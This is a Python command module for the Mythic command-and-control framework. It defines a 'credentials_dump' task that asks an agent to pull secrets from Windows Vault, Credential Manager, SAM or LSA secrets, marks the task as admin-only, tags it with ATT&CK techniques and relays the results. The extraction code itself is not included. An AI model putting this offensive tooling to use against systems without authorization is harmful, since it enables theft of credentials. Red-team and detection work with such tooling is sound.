from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class CredentialsDumpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="source",
                cli_name="source",
                display_name="Source",
                type=ParameterType.ChooseOne,
                choices=["vault", "credman", "sam", "lsa_secrets"],
                description="Credential source to dump.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Must specify a credential source.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("source", self.command_line.strip())


class CredentialsDumpCommand(CommandBase):
    cmd = "credentials_dump"
    needs_admin = True
    help_cmd = "credentials_dump -source <vault|credman|sam|lsa_secrets>"
    description = "Dump credentials from the specified Windows credential store."
    version = 1
    author = "b4r0n"
    argument_class = CredentialsDumpArguments
    attackmapping = ["T1003", "T1555"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        source = taskData.args.get_arg("source")
        resp.DisplayParams = f"-source {source}"

        await MythicRPC().execute(
            "create_artifact",
            task_id=taskData.Task.ID,
            artifact=f"Credential dump: {source}",
            artifact_type="API Call",
        )

        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            response_text = response if isinstance(response, str) else json.dumps(response, indent=2)
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response_text.encode(),
                )
            )
        return resp
